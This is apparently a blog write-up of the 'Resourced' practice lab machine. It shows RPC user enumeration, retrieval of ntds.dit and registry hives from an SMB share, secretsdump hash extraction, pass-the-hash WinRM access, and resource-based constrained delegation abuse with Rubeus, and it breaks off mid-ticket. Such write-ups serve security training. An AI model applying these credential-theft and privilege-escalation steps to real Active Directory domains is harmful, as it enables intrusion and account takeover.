---
title: Resourced
categories:
  - PG
tags:
  - boot2root
  - OSCP-Prep
---

# Machine Information

- Machine Name: Resourced
- Machine Difficulty: Medium

## Information Gathering

Classic nmap time

```bash
Nmap scan report for 192.168.118.175
Host is up, received user-set (0.015s latency).
Scanned at 2024-10-16 16:13:53 +08 for 203s
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 125 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2024-10-16 08:15:30Z)
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 125
464/tcp   open  kpasswd5?     syn-ack ttl 125
593/tcp   open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 125
3268/tcp  open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 125
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Issuer: commonName=ResourceDC.resourced.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-01T01:04:02
| Not valid after:  2025-01-31T01:04:02
| MD5:   4475:0013:03bf:ab5a:a434:2540:33df:2be4
| SHA-1: 9773:cce8:ffe7:07ef:802b:f7fe:5eb8:a0de:cb79:f305
| -----BEGIN CERTIFICATE-----
| MIIC+DCCAeCgAwIBAgIQO3mUEsrjqqxPc8gcJVcmwjANBgkqhkiG9w0BAQsFADAl
| MSMwIQYDVQQDExpSZXNvdXJjZURDLnJlc291cmNlZC5sb2NhbDAeFw0yNDA4MDEw
| MTA0MDJaFw0yNTAxMzEwMTA0MDJaMCUxIzAhBgNVBAMTGlJlc291cmNlREMucmVz
| b3VyY2VkLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0xIJ
| a88VyVbX9XFoOiPp0gi4p0aPI1kkMQr5YtypfrqsMZP/lDQNlcWQerXdwieiA7EK
| 3z5wJUH8n2HNxvKffjuQftlj5J3jm2/iQCN6Pnw5caxY0Yrc2lNUqjfGrMM9CaE0
| aerbYrs2AEVsYUh4MGFMs00Rzq85wF2L7odJzoF7RhsejkG0X1qkxnVjGEG3/n9j
| CsU8cb+Yfz8M+XM9l9giPAqPBxUlivZuN0A6+FIK3iuXzmLYagC5Q9kkXFnuw47l
| DrJwgdUjmOJTSjiX3kr9zgbATYSfi2FQ/oX7X7QmejvAPIV3wx0mcHDtdWYVRaKk
| ilMbNlwVFvsbI4tqmQIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNV
| HQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAKA15JsYn18fnktvQ066IE88jliv
| aJnO/wOnDxXWDe39TJzPIkJS2SJhWk9MYX/Qy/4a2MVyK/vD+H+KKCXuDh68lySO
| 8cXsucP2mlfvvihEJd2T3cTMr7RVpCY2PB85AABlhJo3glkL305GQBpZS+Fh/lPl
| mt+uJn0/TKduIbFtySPpT2QlufXijRajkv3TNJcoDi5POpP7fkDHZkCCqDagDRMF
| bssqDmbriUsRnVn5mccUXumyRH63ZDqoXIimNdFQV9XEu0jEnn6iVs/ERxWPmbxJ
| KKjV/FuvSqB5fjLgtITuj3HNuJpkDHd6ALxsbYzcNL5qK4XsmqUb+HrReIk=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2024-10-16T08:16:33+00:00
|_ssl-date: 2024-10-16T08:17:14+00:00; -2s from scanner time.
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 125 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49708/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
```

No interesting port that I could try out so I decided to check every port.

## port 135

After trying alot of ports, I got some useful information from this port.

```bash
rpcclient -U '' -N  192.168.118.175 -c querydispinfo
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant       Name: (null)    Desc: Linear Algebra and crypto god
index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg     Name: (null)    Desc: Blockchain expert
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson      Name: (null)    Desc: Networking specialist
index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen Name: (null)    Desc: Frontend Developer
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone  Name: (null)    Desc: SysAdmin
index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason        Name: (null)    Desc: Ex IT admin
index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker       Name: (null)    Desc: Backend Developer
index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson     Name: (null)    Desc: Database Admin
index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson      Name: (null)    Desc: Military Vet now cybersecurity specialist
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)    Desc: New-hired, reminder: HotelCalifornia194!
```

I managed to retrieve a bunch of users and also the description. (It is possible to achieve similar result by using `enum4linux-ng`) In one of the user's description, there's a reminder that looks like a credential, `V.Ventz:HotelCalifornia194!`. Time to use the credential to spray on every other services.

## Port 139/445

```bash
etexec smb 192.168.118.175 -u V.Ventz -p HotelCalifornia194!
SMB         192.168.118.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
SMB         192.168.118.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 
```

After spraying, the user `V.Ventz` is able to access the smb file share. Time to explore what's available in the share.

```bash
smbmap -H 192.168.118.175 -u V.Ventz -p 'HotelCalifornia194!'                                       

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<mailto:ShawnDEvans@gmail.com>
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.118.175:445     Name: 192.168.118.175           Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Password Audit                                          READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections                                                                                                     
```

It seems like there's a interesting share name `Password Audit`. I then download everything and see what's inside.

```bash
smbmap -H 192.168.118.175 -u V.Ventz -p 'HotelCalifornia194!' -r "Password Audit" --depth 3 -A '(.)'                                                                                                                                    
                                                                                                                                                                                                                                            
    ________  ___      ___  _______   ___      ___       __         _______                                                                                                                                                                 
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\         
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)          
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/           
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /                    
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \                    
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)                
-----------------------------------------------------------------------------                      
SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<mailto:ShawnDEvans@gmail.com>
                     https://github.com/ShawnDEvans/smbmap                                                            
                                                                                                                                                                                                                                            
[*] Detected 1 hosts serving SMB                                                                                                   
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                       
[*] Performing file name pattern match!                                                                                       
[+] Match found! Downloading: Password Audit/Active Directory/ntds.dit                                                       
[+] Starting download: Password Audit\Active Directory\ntds.dit (25165824 bytes)                                             
[+] File output to: /root/pg/Resourced/192.168.118.175-Password Audit_Active Directory_ntds.dit                              
[+] Match found! Downloading: Password Audit/Active Directory/ntds.jfm
[+] Starting download: Password Audit\Active Directory\ntds.jfm (16384 bytes)                                                
[+] File output to: /root/pg/Resourced/192.168.118.175-Password Audit_Active Directory_ntds.jfm                              
[+] Match found! Downloading: Password Audit/registry/SECURITY                                                               
[+] Starting download: Password Audit\registry\SECURITY (65536 bytes)                                                        
[+] File output to: /root/pg/Resourced/192.168.118.175-Password Audit_registry_SECURITY                                      
[+] Match found! Downloading: Password Audit/registry/SYSTEM
[+] Starting download: Password Audit\registry\SYSTEM (16777216 bytes)                                                       
[+] File output to: /root/pg/Resourced/192.168.118.175-Password Audit_registry_SYSTEM                                        
[*] Closed 1 connections                                                                                                      
```

Alright, it seems like I have a `ntds.dit` and `SYSTEM` file which is useful as I could get hashes with this two files.

```bash
impacket-secretsdump -ntds 192.168.118.175-Password\ Audit_Active\ Directory_ntds.dit -system 192.168.118.175-Password\ Audit_registry_SYSTEM -security 192.168.118.175-Password\ Audit_registry_SECURITY LOCAL
Impacket v0.12.0.dev1 - Copyright 2023 Fortra                                                                         
                                                           
[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d                                  
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets            
[*] $MACHINE.ACC                                                                                                      
$MACHINE.ACC:plain_password_hex:507fdb105d9322cf53420c95780adf5f2dcdac7ca14f8b37188370c916a3fa6f2a511bb284aeac71211c939a866a2b4cc02c408e1d242ad4f5cc8f7b85d2448c18d23fb47f7b9b543a6cfb8999e40037f23dbfd8690869753979d15fe61bdcddb0ccff3d20c2
75207ca93e844c3b5aa1f658198225b3e54f90e0b71aaf76ba32bb1b598d189b6696c27d04674fd4c4f2c09d0df2e59fe93850aa928be813be3bd659f0d2ecba6e34fb5a3880db8155cf77e21eb44d63e1ae65abcc2aa5bdfb6bfe85e8590329929522aae501ba86d8622918e37b41daef8a2b00e784
40d13e88a31fc14714923bba6fb99e13c81b3020                                                                              
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d
[*] DPAPI_SYSTEM                      
dpapi_machinekey:0x85ec8dd0e44681d9dc3ed5f0c130005786daddbd                                     
dpapi_userkey:0x22043071c1e87a14422996eda74f2c72535d4931                                                              
[*] NL$KM                           
 0000   31 BF AC 76 98 3E CF 4A  FC BD AD 0F 17 0F 49 E7   1..v.>.J......I.                       
 0010   DA 65 A6 F9 C7 D4 FA 92  0E 5C 60 74 E6 67 BE A7   .e.......\`t.g..
 0020   88 14 9D 4D E5 A5 3A 63  E4 88 5A AC 37 C7 1B F9   ...M..:c..Z.7...
 0030   53 9C C1 D1 6F 63 6B D1  3F 77 F4 3A 32 54 DA AC   S...ock.?w.:2T..                      
NL$KM:31bfac76983ecf4afcbdad0f170f49e7da65a6f9c7d4fa920e5c6074e667bea788149d4de5a53a63e4885aac37c71bf9539cc1d16f636bd13f77f43a3254daac
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient                                                                                 
[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94  
[*] Reading and decrypting hashes from 192.168.118.175-Password Audit_Active Directory_ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::           
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::                    
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::                                    
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::                                  
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
[*] Kerberos keys from 192.168.118.175-Password Audit_Active Directory_ntds.dit
Administrator:aes256-cts-hmac-sha1-96:73410f03554a21fb0421376de7f01d5fe401b8735d4aa9d480ac1c1cdd9dc0c8
Administrator:aes128-cts-hmac-sha1-96:b4fc11e40a842fff6825e93952630ba2                                                
Administrator:des-cbc-md5:80861f1a80f1232f                 
RESOURCEDC$:aes256-cts-hmac-sha1-96:b97344a63d83f985698a420055aa8ab4194e3bef27b17a8f79c25d18a308b2a4                  
RESOURCEDC$:aes128-cts-hmac-sha1-96:27ea2c704e75c6d786cf7e8ca90e0a6a
RESOURCEDC$:des-cbc-md5:ab089e317a161cc1
krbtgt:aes256-cts-hmac-sha1-96:12b5d40410eb374b6b839ba6b59382cfbe2f66bd2e238c18d4fb409f4a8ac7c5
krbtgt:aes128-cts-hmac-sha1-96:3165b2a56efb5730cfd34f2df472631a                                                       
krbtgt:des-cbc-md5:f1b602194f3713f8
M.Mason:aes256-cts-hmac-sha1-96:21e5d6f67736d60430facb0d2d93c8f1ab02da0a4d4fe95cf51554422606cb04
M.Mason:aes128-cts-hmac-sha1-96:99d5ca7207ce4c406c811194890785b9                                                      
M.Mason:des-cbc-md5:268501b50e0bf47c                       
K.Keen:aes256-cts-hmac-sha1-96:9a6230a64b4fe7ca8cfd29f46d1e4e3484240859cfacd7f67310b40b8c43eb6f
K.Keen:aes128-cts-hmac-sha1-96:e767891c7f02fdf7c1d938b7835b0115   
K.Keen:des-cbc-md5:572cce13b38ce6da
L.Livingstone:aes256-cts-hmac-sha1-96:cd8a547ac158c0116575b0b5e88c10aac57b1a2d42e2ae330669a89417db9e8f                
L.Livingstone:aes128-cts-hmac-sha1-96:1dec73e935e57e4f431ac9010d7ce6f6
L.Livingstone:des-cbc-md5:bf01fb23d0e6d0ab
J.Johnson:aes256-cts-hmac-sha1-96:0452f421573ac15a0f23ade5ca0d6eada06ae85f0b7eb27fe54596e887c41bd6                    
J.Johnson:aes128-cts-hmac-sha1-96:c438ef912271dbbfc83ea65d6f5fb087             
J.Johnson:des-cbc-md5:ea01d3d69d7c57f4
V.Ventz:aes256-cts-hmac-sha1-96:4951bb2bfbb0ffad425d4de2353307aa680ae05d7b22c3574c221da2cfb6d28c
V.Ventz:aes128-cts-hmac-sha1-96:ea815fe7c1112385423668bb17d3f51d                                                      
V.Ventz:des-cbc-md5:4af77a3d1cf7c480
S.Swanson:aes256-cts-hmac-sha1-96:8a5d49e4bfdb26b6fb1186ccc80950d01d51e11d3c2cda1635a0d3321efb0085
S.Swanson:aes128-cts-hmac-sha1-96:6c5699aaa888eb4ec2bf1f4b1d25ec4a         
S.Swanson:des-cbc-md5:5d37583eae1f2f34                                                                                
P.Parker:aes256-cts-hmac-sha1-96:e548797e7c4249ff38f5498771f6914ae54cf54ec8c69366d353ca8aaddd97cb
P.Parker:aes128-cts-hmac-sha1-96:e71c552013df33c9e42deb6e375f6230
P.Parker:des-cbc-md5:083b37079dcd764f                                                                                 
R.Robinson:aes256-cts-hmac-sha1-96:90ad0b9283a3661176121b6bf2424f7e2894079edcc13121fa0292ec5d3ddb5b                   
R.Robinson:aes128-cts-hmac-sha1-96:2210ad6b5ae14ce898cebd7f004d0bef
R.Robinson:des-cbc-md5:7051d568dfd0852f                                                                               
D.Durant:aes256-cts-hmac-sha1-96:a105c3d5cc97fdc0551ea49fdadc281b733b3033300f4b518f965d9e9857f27a
D.Durant:aes128-cts-hmac-sha1-96:8a2b701764d6fdab7ca599cb455baea3             
D.Durant:des-cbc-md5:376119bfcea815f8                                                                                 
G.Goldberg:aes256-cts-hmac-sha1-96:0d6ac3733668c6c0a2b32a3d10561b2fe790dab2c9085a12cf74c7be5aad9a91
G.Goldberg:aes128-cts-hmac-sha1-96:00f4d3e907818ce4ebe3e790d3e59bf7              
G.Goldberg:des-cbc-md5:3e20fd1a25687673                                                                               
[*] Cleaning up...                       

```

After dumping out, I save the usernames and hashes into a file and spray all the services again.

## Port 5985

```bash
netexec winrm 192.168.118.175 -u user -H hashes --no-bruteforce --continue-on-success
WINRM       192.168.118.175 5985   RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local)
WINRM       192.168.118.175 5985   RESOURCEDC       [-] resourced.local\Administrator:12579b1666d4ac10f0f59f300776495f
WINRM       192.168.118.175 5985   RESOURCEDC       [-] resourced.local\Guest:31d6cfe0d16ae931b73c59d7e0c089c0
WINRM       192.168.118.175 5985   RESOURCEDC       [-] resourced.local\RESOURCEDC$:9ddb6f4d9d01fedeb4bccfb09df1b39d
WINRM       192.168.118.175 5985   RESOURCEDC       [-] resourced.local\krbtgt:3004b16f88664fbebfcb9ed272b0565b
WINRM       192.168.118.175 5985   RESOURCEDC       [-] resourced.local\M.Mason:3105e0f6af52aba8e11d19f27e487e45
WINRM       192.168.118.175 5985   RESOURCEDC       [-] resourced.local\K.Keen:204410cc5a7147cd52a04ddae6754b0c
WINRM       192.168.118.175 5985   RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)
WINRM       192.168.118.175 5985   RESOURCEDC       [-] resourced.local\J.Johnson:3e028552b946cc4f282b72879f63b726
WINRM       192.168.118.175 5985   RESOURCEDC       [-] resourced.local\V.Ventz:913c144caea1c0a936fd1ccb46929d3c
WINRM       192.168.118.175 5985   RESOURCEDC       [-] resourced.local\S.Swanson:bd7c11a9021d2708eda561984f3c8939
WINRM       192.168.118.175 5985   RESOURCEDC       [-] resourced.local\P.Parker:980910b8fc2e4fe9d482123301dd19fe
WINRM       192.168.118.175 5985   RESOURCEDC       [-] resourced.local\R.Robinson:fea5a148c14cf51590456b2102b29fac
WINRM       192.168.118.175 5985   RESOURCEDC       [-] resourced.local\D.Durant:08aca8ed17a9eec9fac4acdcb4652c35
WINRM       192.168.118.175 5985   RESOURCEDC       [-] resourced.local\G.Goldberg:62e16d17c3015c47b4d513e65ca757a2
```

After spraying every services, I got a `Pwn3d!` in winrm on one of the user which mean I could get a shell.

```powershell
evil-winrm -i 192.168.118.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> whoami
resourced\l.livingstone
```

Since I do not have administrator privilege account, time to privilege escalation.

## Privilege Escalation.

Always start with winpeas. it's do not have much useful information in my case, so I decided to look into other things such as bloodhound. To use bloodhound, I'll need to capture the required data. I'll be using `SharpHound.exe` here by uploading it into the machine.

```powershell
*Evil-WinRM* PS C:\Users\L.Livingstone\documents> .\SharpHound.exe -c All
2024-10-16T02:06:43.4167217-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2024-10-16T02:06:43.5104677-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-10-16T02:06:43.5260935-07:00|INFORMATION|Initializing SharpHound at 2:06 AM on 10/16/2024
2024-10-16T02:06:43.6042185-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for resourced.local : ResourceDC.resourced.local
2024-10-16T02:06:43.8542159-07:00|INFORMATION|Loaded cache with stats: 59 ID to type mappings.
 59 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-10-16T02:06:43.8542159-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-10-16T02:06:43.9479659-07:00|INFORMATION|Beginning LDAP search for resourced.local
2024-10-16T02:06:43.9792184-07:00|INFORMATION|Producer has finished, closing LDAP channel
2024-10-16T02:06:43.9792184-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-10-16T02:07:14.5885987-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 38 MB RAM
2024-10-16T02:07:27.3073412-07:00|INFORMATION|Consumers finished, closing output channel
2024-10-16T02:07:27.3229656-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2024-10-16T02:07:27.3854667-07:00|INFORMATION|Status: 101 objects finished (+101 2.348837)/s -- Using 41 MB RAM
2024-10-16T02:07:27.3854667-07:00|INFORMATION|Enumeration finished in 00:00:43.4390306
2024-10-16T02:07:27.4323417-07:00|INFORMATION|Saving cache with stats: 59 ID to type mappings.
 59 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-10-16T02:07:27.4323417-07:00|INFORMATION|SharpHound Enumeration Completed at 2:07 AM on 10/16/2024! Happy Graphing!
```

After downloading the zip file to my machine, I started up bloodhound and import the result to have a look and see if there's any useful information.

![](/assets/img/posts/2024-10-16-Resourced/2024-10-16-Resourced-17-12-15.png)

After going through the result, I noticed that my current user has `GenericAll` privilege to the machine. The bloodhound also provided method to exploit, so let me try and see if it works.

### Windows Method

This method requires `Powermad.ps1`, `PowerView.ps1` and `Rubeus.exe` to be uploaded into the victim machine.

```powershell
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> upload ../../../../../opt/useful-tools/windows/ghost/Rubeus.exe
                                        
Info: Uploading /root/pg/Resourced/../../../../../opt/useful-tools/windows/ghost/Rubeus.exe to C:\Users\L.Livingstone\Documents\Rubeus.exe
                                        
Data: 595968 bytes of 595968 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> upload ../../../../../opt/useful-tools/windows/PowerView.ps1
                                        
Info: Uploading /root/pg/Resourced/../../../../../opt/useful-tools/windows/PowerView.ps1 to C:\Users\L.Livingstone\Documents\PowerView.ps1
                                        
Data: 1027036 bytes of 1027036 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> upload ../../../../../opt/useful-tools/windows/Powermad.ps1
                                        
Info: Uploading /root/pg/Resourced/../../../../../opt/useful-tools/windows/Powermad.ps1 to C:\Users\L.Livingstone\Documents\Powermad.ps1
                                        
Data: 180768 bytes of 180768 bytes copied
```

After uploading the tools, the import the powershell script.

```powershell
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> . .\PowerView.ps1
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> . .\Powermad.ps1
```

After the preparation is done, the first step is to add a new computer account.

```powershell
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> New-MachineAccount -MachineAccount test -Password $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force)
[+] Machine account test added
```

After that, I'll need to retrieve the SID of the newly created computer account and build a generic ACE and get the binary byte for the new DACL/ACE


```powershell
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> $ComputerSid = Get-DomainComputer test -Properties objectsid | Select -Expand objectsid
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> $SD.GetBinaryForm($SDBytes, 0)
```

After this, I'll need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity

```powershell
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

After these is done, get the password hash in `RC4_HMAC` form

```powershell
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> .\Rubeus.exe hash /password:Passw0rd!

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : Passw0rd!
[*]       rc4_hmac             : FC525C9683E8FE067095BA2DDC971889

[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!
```

After this, I'll just need to use `s4u` module to get a service ticket.

```powershell
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> .\Rubeus.exe s4u /user:test /rc4:FC525C9683E8FE067095BA2DDC971889 /impersonateuser:administrator /msdsspn:cifs/resourcedc.resourced.local /ptt 
                                                                                                                      
   ______        _                                                                                                    
  (_____ \      | |                                                                                                   
   _____) )_   _| |__  _____ _   _  ___                                                                               
  |  __  /| | | |  _ \| ___ | | | |/___)                                                                              
  | |  \ \| |_| | |_) ) ____| |_| |___ |                                                                              
  |_|   |_|____/|____/|_____)____/(___/                                                                               
                                                                                                                      
  v2.2.0                                                                                                              
                                                                                                                      
[*] Action: S4U                                                                                                       
                                                                                                                      
[*] Using rc4_hmac hash: FC525C9683E8FE067095BA2DDC971889                                                             
[*] Building AS-REQ (w/ preauth) for: 'resourced.local\test'                          
[*] Using domain controller: ::1:88                                                                                   
[+] TGT request successful!                                                                                           
[*] base64(ticket.kirbi):                                                                                             

      doIFBDCCBQCgAwIBBaEDAgEWooIEFDCCBBBhggQMMIIECKADAgEFoREbD1JFU09VUkNFRC5MT0NBTKIk
      MCKgAwIBAqEbMBkbBmtyYnRndBsPcmVzb3VyY2VkLmxvY2Fso4IDxjCCA8KgAwIBEqEDAgECooIDtASC
      A7CcGR3H8v6f2ferew54L5x5ogY7wqoKbpetOGxWvwJdLzWIziKLsssKg2kCEuZG2FDQGdTzNNKBcQJj
      g6rRNf6P3Dg+vPAaA+vFFObwq9MVZKpHdpeQfjbYtStin9/LFULu6PVk9RiS3DEbmWjWf3uNCTf7BMWX
      NtkuygLOEh3kvulETvgbIBVm0HBXwrGM+dKa9rW5XXR9Q+i/rEGGHIzEdE/6TiP0ivCziqN74QIqLiMf
      vdt5s+KiBOcnsSjVKK+Rw4127hEHGu/6EPQN8NSycrdAZxJSVVpX9vptR1sXSJYiLw7+4j7Hr+I5Y7D6
      edwjU2ApXDRJcasb/cDSgcRq7RBJglFyGKStSRxT7QVuZdbqKWGUh68fOj05SsWDQr7GZzTa0VeQarUu
      yWF8i+LUrd4dTJKAzI2zMdYQhEzgF7ObgQ1KjXPOoF7Z4Pi5oGVXfPH587+TR7fMsx7kke+ULHypdpI+
